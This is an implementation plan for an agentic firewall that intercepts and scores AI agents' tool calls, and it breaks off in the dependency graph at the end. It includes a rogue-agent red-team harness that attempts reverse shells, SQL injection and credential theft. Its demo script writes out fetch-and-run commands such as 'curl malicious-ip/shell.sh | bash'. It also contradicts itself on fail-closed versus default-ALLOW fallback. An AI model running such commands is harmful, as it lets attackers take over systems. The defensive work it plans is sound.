# Implementation Plan: Blackwall Agentic Firewall

## Overview

This implementation plan breaks down the Blackwall Agentic Firewall into discrete, testable tasks following a test-driven development approach. The system will be implemented in **Python** using ADK 2.0, with asynchronous processing via asyncio, SQLite for threat signature storage, and integration with GTI and codebase-memory MCPs. Tasks are ordered by dependency (foundational → integration → evaluation → demo) and include both implementation and testing sub-tasks.

## Tasks

- [ ] 1. Set up project structure and core infrastructure
  - Create Python project with Poetry/pip requirements
  - Define project directory structure (src/, tests/, config/, docs/)
  - Set up pytest testing framework with asyncio support
  - Configure pre-commit hooks for linting (ruff, mypy)
  - Create base configuration file structure (YAML policy template)
  - Set up logging framework (structlog with JSON output)
  - Initialize git repository with .gitignore for Python
  - _Requirements: 14.1, 14.2, 14.3_

- [ ] 2. Implement core data models and type definitions
  - [ ] 2.1 Create data model classes using Pydantic
    - Define CallbackToken, ToolCallContext, Verdict data classes
    - Define ThreatSignature, SecurityEvent, PolicyServerState data classes
    - Define GTIResponse, CBMResponse, BehaviorScore data classes
    - Implement validation logic for all models (type checking, range constraints)
    - Write Pydantic validators for UUID formats, timestamp ranges, threat scores
    - _Requirements: 1.2, 3.11, 5.6_
  
  - [ ]* 2.2 Write unit tests for data model validation
    - Test valid model instantiation with correct fields
    - Test invalid inputs trigger ValidationError
    - Test threat score bounds [0.0, 1.0]
    - Test semantic versioning format for policy version
    - _Requirements: 1.2, 3.11_

- [ ] 3. Implement Context Hygiene middleware
  - [ ] 3.1 Create ContextHygiene class with regex redaction
    - Implement sanitize() method with regex pattern matching
    - Define default redaction patterns (API keys, IPs, file paths, passwords, emails, URLs)
    - Implement registerPattern() for custom pattern registration
    - Implement applyRedaction() with timeout protection (100ms)
    - Create RedactionEntry logging with SHA256 one-way hashes
    - Handle catastrophic backtracking with regex timeout
    - _Requirements: 4.1, 4.2, 4.3, 4.4, 4.5, 4.6, 4.7, 4.8, 4.11_
  
  - [ ] 3.2 Test idempotence property for sanitization
    - **Property 1: Sanitization Idempotence**
    - **Validates: Requirements 4.9**
    - Generate random ToolCallContext with sensitive data
    - Apply sanitization twice: sanitize(sanitize(context))
    - Assert both results are identical
  
  - [ ]* 3.3 Write unit tests for Context Hygiene
    - Test API key redaction with pattern matching
    - Test IP address placeholder replacement
    - Test file path sanitization
    - Test JSON structure preservation after redaction
    - Test redaction log contains SHA256 hashes only
    - _Requirements: 4.1, 4.2, 4.3, 4.4, 4.5, 4.6, 4.7, 4.10_


- [ ] 4. Implement SQLite Threat Signature Graph with WAL mode
  - [ ] 4.1 Create ThreatSignatureGraph class with SQLite backend
    - Initialize SQLite connection pool with max 10 connections
    - Enable WAL mode with PRAGMA journal_mode=WAL
    - Configure synchronous=NORMAL and wal_autocheckpoint=1000
    - Create signatures table schema with indexes
    - Create signature_relationships table for edges
    - Create FTS5 virtual table for full-text search
    - Implement connection pool acquire/release logic
    - _Requirements: 6.1, 6.2, 6.3, 6.4, 6.5, 6.6, 6.7_
  
  - [ ] 4.2 Implement writeSignature() with transactional safety
    - Validate signature uniqueness before insertion
    - Serialize similarity vector to BLOB format
    - Insert signature into signatures table within transaction
    - Update FTS5 index with payload_pattern and attacker_intent
    - Create SIMILAR_TO edges for cosine similarity > 0.85
    - Handle database lock errors with retry logic
    - _Requirements: 6.8, 6.12, 12.4_
  
  - [ ] 4.3 Implement querySimilar() with vector similarity search
    - Encode query context using embedding model
    - Compute cosine similarity against stored vectors
    - Return signatures with similarity >= threshold (default 0.85)
    - Sort results by similarity descending
    - Implement LRU cache for query results (1000 entries)
    - Target sub-10ms query latency for 99th percentile
    - _Requirements: 6.9, 6.10, 6.11, 13.4_
  
  - [ ] 4.4 Implement TTL-based pruning and LFU eviction
    - Create pruneStale() method deleting signatures older than 30 days
    - Create evictLFU() method removing low-match-count signatures when total > 10,000
    - Schedule periodic background task for pruning
    - _Requirements: 6.13, 6.14_
  
  - [ ]* 4.5 Write property test for signature uniqueness
    - **Property 2: Signature Uniqueness**
    - **Validates: Requirements 6.8**
    - Generate multiple ThreatSignature objects with unique IDs
    - Write all signatures to TSG
    - Query all signatures and verify no duplicate signature_id values
  
  - [ ]* 4.6 Write unit tests for Threat Signature Graph
    - Test WAL mode initialization
    - Test signature insertion and retrieval
    - Test cosine similarity computation
    - Test signature update (match_count increment)
    - Test TTL pruning removes old signatures
    - Test LFU eviction when count exceeds 10,000
    - _Requirements: 6.1, 6.2, 6.3, 6.8, 6.12, 6.13, 6.14, 6.15_

- [ ] 5. Implement Interception Queue with callback management
  - [ ] 5.1 Create InterceptionQueue class with asyncio.Queue
    - Implement enqueue() storing CallbackToken with thread safety
    - Implement dequeue() with timeout parameter
    - Implement getBatch() accumulating up to maxSize or maxWaitMs timeout
    - Implement flush() for partial batch handling
    - Implement resolveCallbacks() mapping verdicts to callback tokens
    - Handle emergency flushing when queue size > 50
    - _Requirements: 1.1, 1.2, 1.3, 1.4, 1.7, 1.8_
  
  - [ ] 5.2 Test callback resolution completeness property
    - **Property 3: Callback Resolution Completeness**
    - **Validates: Requirements 1.6**
    - Enqueue multiple callback tokens
    - Process batch and generate verdicts
    - Assert each callback is resumed exactly once
    - Verify no callbacks remain in queue after resolution
  
  - [ ]* 5.3 Write unit tests for Interception Queue
    - Test enqueue and dequeue operations
    - Test batch accumulation with maxSize=5
    - Test timeout flushing with maxWaitMs=100
    - Test verdict array mapping to callback tokens
    - Test emergency flushing when size > 50
    - _Requirements: 1.1, 1.2, 1.3, 1.4, 1.5, 1.7_


- [ ] 6. Implement Batch Resolver with rate limiting
  - [ ] 6.1 Create BatchResolver class with token bucket rate limiter
    - Implement token bucket algorithm tracking 300 RPM sliding window
    - Implement processBatch() accepting array of CallbackTokens
    - Apply Context Hygiene sanitization before API submission
    - Create BatchPayload with batch ID, timestamp, contexts, policy snapshot
    - Implement submitToGemini() using Gemini Interactions API
    - Leverage server-side context caching with caching headers
    - Return BatchResponse with verdicts, processing time, tokens consumed
    - _Requirements: 2.1, 2.6, 2.7_
  
  - [ ] 6.2 Implement exponential backoff for rate limit handling
    - Detect APIRateLimitException from Gemini API
    - Apply exponential backoff delays: 100ms, 200ms, and 400ms
    - Retry batch submission maximum 3 times
    - Fallback to QUARANTINE verdicts if all retries fail (fail closed)
    - Log warning events with elevated monitoring flags
    - _Requirements: 2.2, 2.3, 2.4_
  
  - [ ] 6.3 Implement batch processing metrics tracking
    - Track total batches processed, average batch size, average latency
    - Track rate limit hits and cache hit rate
    - Expose getMetrics() method returning ResolverMetrics
    - Target average batch size >= 3 and 99th percentile latency < 300ms
    - _Requirements: 2.6, 2.7, 2.8, 13.6, 13.8_
  
  - [ ]* 6.4 Write unit tests for Batch Resolver
    - Test token bucket rate limiter enforces 300 RPM cap
    - Test exponential backoff on rate limit exception
    - Test fallback to default ALLOW on retry exhaustion
    - Test batch metrics tracking
    - Test server-side context caching integration
    - _Requirements: 2.1, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7_

- [ ] 7. Implement Structural Gating Engine
  - [ ] 7.1 Create StructuralGatingEngine with YAML policy loader
    - Implement loadPolicy() parsing YAML file into PolicyRules structure
    - Validate YAML schema on load (version, rules, roles, thresholds)
    - Create rule evaluation engine matching conditions
    - Support conditions: toolName, environmentRole, argument patterns
    - Return GateResult with decision (ALLOW/BLOCK/ESCALATE_TO_SEMANTIC)
    - Target <5ms evaluation latency for 99th percentile
    - _Requirements: 3.1, 3.2, 14.1, 14.2, 14.5, 14.10, 13.1_
  
  - [ ] 7.2 Implement hot-reload for YAML policy updates
    - Watch policy file for modifications using file system events
    - Reload policy without process restart
    - Validate new policy before applying (reject invalid configs)
    - Atomically swap policy state to prevent race conditions
    - _Requirements: 3.14, 14.9_
  
  - [ ]* 7.3 Write unit tests for Structural Gating
    - Test YAML policy loading and validation
    - Test rule matching for toolName and environmentRole
    - Test ALLOW fast-path without semantic review
    - Test BLOCK immediate rejection
    - Test ESCALATE_TO_SEMANTIC forwarding
    - Test <5ms latency requirement
    - Test hot-reload without restart
    - _Requirements: 3.1, 3.2, 3.3, 3.4, 3.5, 14.9, 14.10, 13.1_

- [ ] 8. Implement GTI MCP integration
  - [ ] 8.1 Create GTIMCPClient for VirusTotal API queries
    - Implement queryIOC() for IP/domain/URL/hash reputation checks
    - Parse GTIResponse with isMalicious, threatCategories, detectionRate
    - Implement 24-hour TTL caching for responses
    - Handle 5-second query timeout with circuit breaker
    - Implement circuit breaker switching to degraded mode after 5 consecutive failures
    - Apply default threat score penalty of 0.3 in degraded mode
    - Auto-retry after 60-second cooldown period
    - _Requirements: 7.1, 7.2, 7.3, 7.4, 7.5, 7.6, 7.7, 7.8, 7.9, 7.10_
  
  - [ ]* 8.2 Write unit tests for GTI MCP integration
    - Test IOC query for malicious IP returns isMalicious=true
    - Test 24-hour cache TTL reduces API calls
    - Test 5-second timeout triggers circuit breaker
    - Test circuit breaker switches to degraded mode after 5 failures
    - Test 60-second cooldown period before retry
    - Test threat score penalty of 0.3 in degraded mode
    - _Requirements: 7.1, 7.2, 7.3, 7.4, 7.5, 7.6, 7.7, 7.8_


- [ ] 9. Implement codebase-memory MCP integration
  - [ ] 9.1 Create CodebaseMemoryClient for AST analysis
    - Implement queryDependencyChain() returning call chain and critical sinks
    - Implement identifyCriticalSinks() detecting SQL_QUERY, COMMAND_EXEC, FILE_WRITE, NETWORK_CALL
    - Implement traceDataFlow() identifying tainted data paths
    - Implement getBlastRadius() calculating affected modules and risk score
    - Handle 2-second query timeout
    - Apply threat score penalty of 0.4 when graph is stale (>1 hour old)
    - Continue evaluation without CBM if unavailable
    - _Requirements: 8.1, 8.2, 8.3, 8.4, 8.5, 8.6, 8.7, 8.8, 8.9, 8.10_
  
  - [ ]* 9.2 Write unit tests for codebase-memory integration
    - Test dependency chain query returns call path
    - Test critical sink detection (SQL, command exec)
    - Test unsafe sink identification
    - Test data flow tracing from source to sink
    - Test blast radius calculation
    - Test 2-second timeout handling
    - Test threat score penalty when graph is stale
    - _Requirements: 8.1, 8.2, 8.3, 8.4, 8.5, 8.6, 8.7, 8.8_

- [ ] 10. Implement Semantic Gating Engine
  - [ ] 10.1 Create SemanticGatingEngine with LLM-based intent analysis
    - Implement evaluate() querying Threat Signature Graph first
    - Extract IOCs from context (IPs, URLs, domains, hashes)
    - Query GTI MCP for each IOC if no signature match
    - Query codebase-memory MCP if context has targetFunction
    - Implement computeThreatScore() aggregating signals (GTI 40%, CBM 30%, Context 30%)
    - Apply verdict thresholds: >=0.75 BLOCK, >=0.5 QUARANTINE, <0.5 ALLOW
    - Return GateResult with verdict, reason, threat score
    - _Requirements: 3.6, 3.7, 3.8, 3.9, 3.10, 3.11, 3.12, 3.13_
  
  - [ ] 10.2 Test threat score bounded property
    - **Property 4: Threat Score Bounded**
    - **Validates: Requirements 3.10**
    - Generate diverse ToolCallContext samples
    - Compute threat score for each
    - Assert all scores are in range [0.0, 1.0]
    - Verify BLOCK verdict only when score >= 0.75
  
  - [ ]* 10.3 Write unit tests for Semantic Gating
    - Test signature matching returns BLOCK with signatureId
    - Test GTI malicious IOC returns high threat score
    - Test CBM critical sink detection increases threat score
    - Test threat score aggregation weighted formula
    - Test verdict thresholds (0.75 BLOCK, 0.5 QUARANTINE)
    - Test signature match count increment
    - _Requirements: 3.6, 3.7, 3.8, 3.9, 3.10, 3.11, 3.12, 3.13_

- [ ] 11. Implement Hybrid Policy Server orchestrator
  - [ ] 11.1 Create HybridPolicyServer coordinating gating engines
    - Implement evaluate() invoking Structural Gating first
    - Fast-path return BLOCK if structural gate blocks
    - Fast-path return ALLOW if structural gate allows without review
    - Invoke Semantic Gating if structural gate escalates
    - Implement evaluateBatch() processing multiple contexts in parallel
    - Return verdict array maintaining input order
    - Expose updatePolicy() for hot-reload
    - _Requirements: 3.1, 3.2, 3.3, 3.4, 3.5, 3.6_
  
  - [ ] 11.2 Test verdict array order correspondence
    - **Property 5: Verdict Array Correspondence**
    - **Validates: Requirements 3.1, 1.5**
    - Create batch of 10 diverse ToolCallContext objects
    - Process batch through HybridPolicyServer
    - Assert verdict array length equals input array length
    - Verify verdict[i] corresponds to context[i] for all i
  
  - [ ]* 11.3 Write integration tests for Hybrid Policy Server
    - Test structural BLOCK skips semantic evaluation
    - Test structural ALLOW without review skips semantic
    - Test structural ESCALATE triggers semantic gating
    - Test batch processing returns correctly ordered verdicts
    - Test end-to-end flow with GTI and CBM queries
    - _Requirements: 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 3.14_

- [ ] 12. Checkpoint - Ensure core interception pipeline is functional
  - Run integration tests for Interception Queue + Batch Resolver + Hybrid Policy Server
  - Verify <300ms latency for semantic evaluation with GTI/CBM
  - Verify <5ms latency for structural fast-path
  - Ask the user if questions arise


- [ ] 13. Implement Agent Behavioral Analytics (ABA)
  - [ ] 13.1 Create AgentBehavioralAnalytics for threat signature generation
    - Implement scoreEvent() calculating behavioral drift using LLM-as-judge (0-5 scale)
    - Implement detectDrift() analyzing agent behavior across time windows
    - Detect anomalies when drift exceeds tolerance band ±0.5 from baseline
    - Implement generateSignature() extracting attacker intent from blocked events
    - Generalize payload patterns replacing specific values with placeholders
    - Query codebase-memory MCP for dependency chain if function target exists
    - Generate embedding vector using sentence-transformers model (384 dimensions)
    - Determine mitigation action based on GTI/CBM signals
    - _Requirements: 5.1, 5.2, 5.3, 5.4, 5.5, 5.6, 5.7, 5.8, 5.9_
  
  - [ ] 13.2 Implement Green Team auto-refactoring for QUARANTINE verdicts
    - Implement triggerRefactoring() generating RefactoringHint
    - Analyze vulnerability type from CBM critical sink
    - Generate suggested fix (e.g., "Use parameterized queries" for SQL injection)
    - Write signature with refactoring hint to TSG
    - _Requirements: 5.10, 16.1, 16.2, 16.3, 16.4_
  
  - [ ] 13.3 Implement Runtime AgBOM tracking
    - Implement updateAgBOM() recording tool usage and capabilities
    - Track tool frequencies and argument patterns
    - Detect capability drift (new tools used without policy approval)
    - Log anomaly events when drift detected
    - _Requirements: 5.11, 10.9_
  
  - [ ]* 13.4 Write unit tests for Agent Behavioral Analytics
    - Test signature generation from BLOCK verdict
    - Test payload generalization (replace IPs with placeholders)
    - Test attacker intent extraction
    - Test embedding vector generation (384 dimensions)
    - Test behavioral drift detection
    - Test Green Team refactoring hint generation
    - Test AgBOM update on capability drift
    - _Requirements: 5.1, 5.2, 5.3, 5.4, 5.5, 5.6, 5.7, 5.8, 5.9, 5.10, 5.11_

- [ ] 14. Implement OpenTelemetry instrumentation
  - [ ] 14.1 Create OpenTelemetry tracer for security events
    - Initialize OpenTelemetry SDK with trace provider
    - Implement span creation for each SecurityEvent with unique trace ID
    - Include tool call details, verdict, threat score, signature ID in spans
    - Implement distributed tracing across Blackwall, GTI MCP, CBM MCP, ADK
    - Aggregate traces to visualize Vibe Trajectory
    - Compress spans before export to keep bandwidth < 100KB/s
    - _Requirements: 11.1, 11.2, 11.3, 11.4, 11.8_
  
  - [ ] 14.2 Implement Prometheus metrics export
    - Export metrics: total interceptions, verdicts by type, avg threat scores
    - Export API latency, batch sizes, cache hit rates, error counts
    - Expose metrics endpoint for Prometheus scraping
    - _Requirements: 11.5_
  
  - [ ] 14.3 Create structured JSON logging for security events
    - Implement JSON logger with event ID, timestamp, agent ID, verdict, telemetry span ID
    - Log all SecurityEvent objects with full context
    - Include redaction metadata from Context Hygiene
    - _Requirements: 11.7, 5.12_
  
  - [ ]* 14.4 Write unit tests for observability
    - Test OpenTelemetry span creation
    - Test trace ID uniqueness
    - Test span includes verdict and threat score
    - Test Prometheus metrics increment
    - Test JSON log format validation
    - _Requirements: 11.1, 11.2, 11.5, 11.7_

- [ ] 15. Implement ADK integration and before_tool_callback hook
  - [ ] 15.1 Create ADK callback integration layer
    - Implement before_tool_callback() hook intercepting tool calls
    - Suspend execution thread and create CallbackToken
    - Enqueue CallbackToken to Interception Queue
    - Implement resumeCallback() function returning verdict to ADK
    - Handle ALLOW verdict: proceed with tool execution
    - Handle BLOCK verdict: return PermissionError to agent
    - Handle QUARANTINE verdict: return sanitized mock response
    - _Requirements: 1.1, 1.6, 16.5, 16.6_
  
  - [ ] 15.2 Implement Python Runtime Audit Hooks
    - Register sys.addaudithook for os, subprocess, pty modules
    - Deny raw execution with PermissionError
    - Force agent actions through ADK tool layer
    - Log bypass attempts as high-severity security events
    - _Requirements: 10.6, 10.7, 10.8_
  
  - [ ]* 15.3 Write integration tests for ADK callback
    - Test before_tool_callback suspends execution
    - Test callback token creation and storage
    - Test resumeCallback with ALLOW verdict executes tool
    - Test resumeCallback with BLOCK verdict returns PermissionError
    - Test audit hook denies raw os/subprocess calls
    - _Requirements: 1.1, 1.2, 1.6, 10.6, 10.7, 10.8_


- [ ] 16. Implement evaluation metrics calculator
  - [ ] 16.1 Create SecurityMetrics calculator for FRR and Evasion Rate
    - Implement calculateMetrics() accepting test results and ground truth labels
    - Count true positives, true negatives, false positives, false negatives
    - Calculate False Refusal Rate (FRR): (false positives / total benign) × 100
    - Calculate Evasion Rate: (false negatives / total malicious) × 100
    - Calculate accuracy, precision, recall, F1 score
    - Verify sum: TP + TN + FP + FN = total tests
    - Export metrics to JSON format with keys: "false_refusal_rate", "evasion_rate", "accuracy", "precision", "recall", "f1_score"
    - _Requirements: 9.1, 9.2, 9.3, 9.4, 9.5, 9.6, 9.7, 9.8, 9.9, 9.10, 9.11_
  
  - [ ] 16.2 Test metrics validation property
    - **Property 6: Metrics Sum Validation**
    - **Validates: Requirements 9.10**
    - Generate random test results with ground truth
    - Calculate SecurityMetrics
    - Assert TP + TN + FP + FN equals total tests
    - Verify all percentage values in [0.0, 100.0]
  
  - [ ]* 16.3 Write unit tests for metrics calculator
    - Test FRR calculation with known benign/malicious counts
    - Test Evasion Rate calculation
    - Test accuracy, precision, recall formulas
    - Test F1 score calculation
    - Test JSON export format
    - Test metrics meet targets: FRR < 10%, Evasion < 10%
    - _Requirements: 9.1, 9.2, 9.3, 9.4, 9.5, 9.6, 9.7, 9.8, 9.9_

- [ ] 17. Implement Zero Ambient Authority and JIT token downscoping
  - [ ] 17.1 Create privilege management system
    - Drop OS privileges for Blackwall agent process
    - Implement JIT token downscoping for intercepted tool calls
    - Fetch temporary scoped credentials from secure vault on-demand
    - Revoke credentials immediately after tool call completion
    - Never store long-lived API keys in process memory
    - _Requirements: 10.1, 10.2, 10.3, 10.4, 10.5_
  
  - [ ]* 17.2 Write security tests for Zero Ambient Authority
    - Test process runs as unprivileged user
    - Test temporary credentials are revoked after use
    - Test no long-lived keys in memory dump
    - Test audit hook blocks raw execution bypasses
    - _Requirements: 10.1, 10.2, 10.3, 10.4, 10.6, 10.7_

- [ ] 18. Implement error handling and resilience
  - [ ] 18.1 Create circuit breakers and graceful degradation
    - Implement GTI circuit breaker (already in task 8.1)
    - Implement SQLite write retry with exponential backoff (max 3 attempts)
    - Create in-memory buffer for failed writes (max 100 entries)
    - Implement emergency fallback for evaluation timeout > 10 seconds (return QUARANTINE verdicts)
    - Implement async task cancellation for frozen evaluations using asyncio.wait_for() or asyncio.CancelledError
    - Alternatively: Use subprocess.Popen with timeout for eval isolation (hard timeout at 30 seconds, subprocess termination)
    - Auto-restart evaluation pipeline after cancelled/terminated evaluation
    - Disable regex patterns causing timeout > 100ms
    - _Requirements: 12.1, 12.2, 12.3, 12.4, 12.5, 12.6, 12.7, 12.8, 12.9, 12.10, 12.11_
  
  - [ ]* 18.2 Write resilience tests
    - Test SQLite retry logic on transient lock errors
    - Test in-memory buffer overflow handling
    - Test emergency fallback on 10-second timeout
    - Test async task cancellation on frozen evaluation (asyncio.CancelledError)
    - Test subprocess termination if using subprocess isolation (hard timeout at 30 seconds)
    - Test auto-restart after cancelled/terminated evaluation
    - Test regex pattern auto-disable on timeout
    - _Requirements: 12.4, 12.5, 12.6, 12.7, 12.10, 12.11_

- [ ] 19. Checkpoint - Ensure complete system is functional
  - Run end-to-end integration tests with all components
  - Verify FRR < 10% and Evasion Rate < 10%
  - Verify all latency targets met (5ms structural, 300ms semantic)
  - Verify memory usage < 512MB RSS, CPU < 50% at 300 RPM load
  - Ask the user if questions arise


- [ ] 20. Create test data sets for evaluation
  - [ ] 20.1 Generate malicious test cases (50 minimum)
    - Create SQL injection payloads
    - Create command injection payloads
    - Create malicious IP/URL tool calls
    - Create file path traversal attacks
    - Create reverse shell attempts
    - Create credential exfiltration attempts
    - Create obfuscated payload variants
    - Label all with ground truth: MALICIOUS
    - Document attack category for each test
    - _Requirements: 15.10_
  
  - [ ] 20.2 Generate benign test cases (50 minimum)
    - Create legitimate file read operations
    - Create normal API calls
    - Create standard database queries
    - Create typical subprocess commands (git, npm, etc.)
    - Create safe network requests
    - Label all with ground truth: BENIGN
    - _Requirements: 15.10_
  
  - [ ]* 20.3 Write test suite runner
    - Load test cases with ground truth labels
    - Execute each through Blackwall interception flow
    - Record verdict, execution time, threat score
    - Generate TestResult objects for metrics calculation
    - Export results to JSON for analysis
    - _Requirements: 9.11, 15.10_

- [ ] 21. Set up Kali Linux sandbox environment
  - [ ] 21.1 Create Docker Compose configuration
    - Define Blackwall agent container (Python, ADK 2.0)
    - Define Metasploitable vulnerable app container
    - Define Rogue Agent container (Qwen3-Coder via Hyperbolic API)
    - Configure network isolation between containers
    - Mount shared volumes for log collection
    - Provide API keys via Docker secrets or mounted credential files (e.g., `/run/secrets/gemini_api_key`); containers read credentials from files, not environment variables
    - _Requirements: 15.12, 15.15_
  
  - [ ] 21.2 Configure privilege dropping and audit hooks
    - Set Blackwall container to run as unprivileged user
    - Configure Python audit hooks in container entrypoint
    - Verify audit hooks block raw os/subprocess execution
    - _Requirements: 10.1, 10.6, 10.7, 15.12_
  
  - [ ]* 21.3 Write sandbox smoke tests
    - Test containers start successfully
    - Test network connectivity between Blackwall and vulnerable app
    - Test privilege dropping is enforced
    - Test audit hooks deny raw execution
    - _Requirements: 15.12_

- [ ] 22. Implement rogue agent test harness
  - [ ] 22.1 Create adversarial agent using Antigravity 2.0 harness
    - Configure Qwen3-Coder 480B via Hyperbolic API (600 RPM)
    - Implement attack scenario: attempt reverse shell installation
    - Implement attack scenario: attempt SQL injection
    - Implement attack scenario: attempt credential exfiltration
    - Implement attack scenario: attempt file system traversal
    - Configure ADK to route all tool calls through Blackwall
    - _Requirements: 15.13_
  
  - [ ] 22.2 Implement attack variant generation
    - After initial BLOCK, generate modified payload
    - Test obfuscation techniques (base64, URL encoding, etc.)
    - Test different tool names for same attack vector
    - Verify Blackwall signature matching blocks variants
    - _Requirements: 15.7_
  
  - [ ]* 22.3 Write rogue agent integration tests
    - Test novel attack gets blocked and signature created
    - Test variant attack blocked via signature match
    - Test signature match count increments
    - Test no GTI API call on signature match (cache hit)
    - _Requirements: 15.6, 15.7_

- [ ] 23. Create demo video recording infrastructure
  - [ ] 23.1 Set up split-screen terminal recording
    - Configure tmux or screen for split layout
    - Left pane: Rogue Agent execution attempts
    - Right pane: Blackwall live logs (JSON structured)
    - Configure asciinema or terminalizer for recording
    - _Requirements: 15.5, 15.8_
  
  - [ ] 23.2 Create demo script for dual-agent showdown
    - Script Attempt 1: Rogue agent tries `curl malicious-ip/shell.sh | bash`
    - Show Blackwall interception, GTI query, BLOCK verdict, signature creation
    - Script Attempt 2: Rogue agent tries variant `curl malicious-ip/payload.sh -o /tmp/p && bash /tmp/p`
    - Show Blackwall signature match, instant BLOCK without GTI call
    - Highlight key log entries: threat score, signature ID, mitigation action
    - _Requirements: 15.5, 15.6, 15.7, 15.8_


- [ ] 24. Create YAML policy configuration files
  - [ ] 24.1 Create default policy.yaml with structural rules
    - Define global settings: threatThreshold=0.75, quarantineThreshold=0.5
    - Define environment roles: sandbox and production
    - Define sandbox role: allowedTools=[read_file, write_file], blockedTools=[execute_bash, subprocess]
    - Define production role: requireSemanticReview=true for all tools
    - Define structural rules: safe-file-read (ALLOW), dangerous-exec (BLOCK), network-call (ESCALATE)
    - Define semantic guidelines as plain-language strings
    - _Requirements: 14.1, 14.2, 14.3, 14.4, 14.5, 14.6, 14.7, 14.11_
  
  - [ ] 24.2 Create MCP server configurations in policy.yaml
    - Define GTI MCP settings: enabled=true, cacheSettings={ttl: 86400}, timeout=5000
    - Define codebase-memory MCP settings: enabled=true, timeout=2000, staleness=3600
    - Define Threat Signature Graph settings: dbPath, walMode=true, poolSize=10, similarityThreshold=0.85, ttl=2592000, maxSignatures=10000, embeddingDim=384
    - _Requirements: 14.7, 14.8_
  
  - [ ]* 24.3 Write policy validation tests
    - Test policy loads successfully
    - Test schema validation rejects invalid configs
    - Test environment roles contain required keys
    - Test threat threshold in range [0.0, 1.0]
    - Test semantic versioning format
    - _Requirements: 14.1, 14.2, 14.10, 14.11, 14.12_

- [ ] 25. Create comprehensive README documentation
  - [ ] 25.1 Write project overview and architecture section
    - Explain Blackwall's purpose and Kaggle hackathon context
    - Include architecture diagrams (Mermaid from design doc)
    - Explain hybrid defense: structural + semantic gating
    - Explain self-learning threat signature graph
    - Explain Zero Ambient Authority and JIT downscoping
    - _Requirements: 15.1, 15.2, 15.16_
  
  - [ ] 25.2 Write setup instructions
    - Prerequisites: Python 3.11+, Docker, ADK 2.0
    - Installation: Poetry/pip install
    - Configuration: API keys for Gemini and GTI
    - Running: `adk run` with Blackwall agent
    - Docker Compose sandbox setup
    - _Requirements: 15.2, 15.3, 15.4_
  
  - [ ] 25.3 Write usage examples and API documentation
    - Example: Intercepting a tool call
    - Example: Querying threat signatures
    - Example: Custom policy rules
    - Document YAML policy format
    - Document evaluation metrics format
    - _Requirements: 15.2_
  
  - [ ] 25.4 Write BDD scenarios from design document
    - Include Gherkin scenarios from design doc
    - Scenario 1: Block novel malicious tool call with GTI
    - Scenario 2: Block variant attack using signature matching
    - Scenario 3: Allow benign tool call via structural fast-path
    - Scenario 4: Quarantine suspicious activity with refactoring hint
    - Scenario 5: Handle API rate limit with exponential backoff
    - _Requirements: 15.17_

- [ ] 26. Create Grafana dashboards for observability
  - [ ] 26.1 Create dashboard for FRR and Evasion Rate trends
    - Visualize False Refusal Rate (FRR) over time
    - Visualize Evasion Rate over time
    - Visualize accuracy, precision, recall trends
    - Set alert thresholds: FRR > 10%, Evasion Rate > 10%
    - _Requirements: 11.6_
  
  - [ ] 26.2 Create dashboard for threat score distributions
    - Histogram of threat scores by verdict type
    - Time series of average threat scores
    - Signature match rate vs GTI query rate
    - _Requirements: 11.6_
  
  - [ ] 26.3 Create dashboard for system throughput
    - Requests per minute (RPM) chart
    - Batch size distribution
    - API latency percentiles (p50, p95, p99)
    - Cache hit rates (GTI, TSG query cache)
    - Error counts by type
    - _Requirements: 11.6_

- [ ] 27. Run final evaluation and generate Kaggle submission
  - [ ] 27.1 Execute full test suite with 100+ test cases
    - Run all 50+ malicious test cases
    - Run all 50+ benign test cases
    - Calculate final FRR (False Refusal Rate), Evasion Rate, and F1 score
    - Verify FRR < 10% and Evasion Rate < 10% targets met
    - Export metrics to JSON for submission with standard key names
    - _Requirements: 9.4, 9.5, 9.11, 15.9, 15.10, 15.11_
  
  - [ ] 27.2 Record demo video showing dual-agent showdown
    - Record split-screen terminal with asciinema
    - Show Rogue Agent attempting novel attack
    - Show Blackwall interception, GTI query, BLOCK, signature creation
    - Show Rogue Agent attempting variant attack
    - Show Blackwall signature match, instant BLOCK without GTI
    - Show live logs: threat scores, verdicts, mitigation actions
    - Export video file for Kaggle submission
    - _Requirements: 15.5, 15.6, 15.7, 15.8_
  
  - [ ] 27.3 Prepare final Kaggle submission artifacts
    - Finalize README with all sections complete
    - Include requirements.txt or pyproject.toml
    - Include docker-compose.yml for sandbox
    - Include demo video file
    - Include metrics JSON report
    - Include architectural diagrams
    - Include BDD scenarios documentation
    - Push to public GitHub repository
    - _Requirements: 15.1, 15.2, 15.3, 15.4, 15.5, 15.11, 15.16, 15.17_

- [ ] 28. Final checkpoint - Submission readiness
  - Verify all Kaggle deliverables are complete
  - Verify demo video demonstrates key capabilities
  - Verify metrics meet sub-10% FRR/Evasion targets
  - Verify GitHub repository is public and accessible
  - Review README for clarity and completeness
  - Ask the user if final submission is ready


## Notes

- **Implementation Language**: All code will be written in **Python** using ADK 2.0, asyncio for asynchronous processing, SQLite with WAL mode for persistence, and pytest for testing
- **Tasks marked with `*`** are optional test-related sub-tasks that can be skipped for faster MVP delivery
- **Property-based tests** validate universal correctness properties from the design document
- **Unit tests** validate specific examples and edge cases for each component
- **Integration tests** validate end-to-end flows across multiple components
- **Each task references specific requirements** for traceability to the requirements document
- **Checkpoints** ensure incremental validation at key milestones (core pipeline functional, complete system functional, submission readiness)
- **Task ordering follows dependency flow**: foundational data models → core components (Context Hygiene, TSG, Interception Queue) → policy evaluation (Structural/Semantic Gating, GTI/CBM integration, Hybrid Policy Server) → orchestration (Batch Resolver, ABA) → integration (ADK callbacks, observability) → evaluation (metrics, test data) → demo (sandbox, rogue agent, video) → submission artifacts
- **Performance targets embedded in tasks**: <5ms structural gating, <300ms semantic gating, <10ms TSG queries, <512MB memory, <50% CPU at 300 RPM
- **Security controls embedded throughout**: Zero Ambient Authority, JIT token downscoping, Python audit hooks, privilege dropping, regex redaction, one-way hashing
- **Resilience patterns included**: circuit breakers (GTI), exponential backoff (rate limits, SQLite retries), graceful degradation (missing MCP), watchdog timers, emergency fallbacks
- **Test-driven approach**: Each implementation task has corresponding test sub-task, many with property-based tests for universal guarantees

## Task Dependency Graph

```json
{
  "waves": [
    { "id": 0, "tasks": ["1"] },
    { "id": 1, "tasks": ["2.1", "24.1"] },
    { "id": 2, "tasks": ["2.2", "3.1", "24.2", "24.3"] },
    { "id": 3, "tasks": ["3.2", "3.3", "4.1"] },
    { "id": 4, "tasks": ["4.2", "4.3", "4.4"] },
    { "id": 5, "tasks": ["4.5", "4.6", "5.1"] },
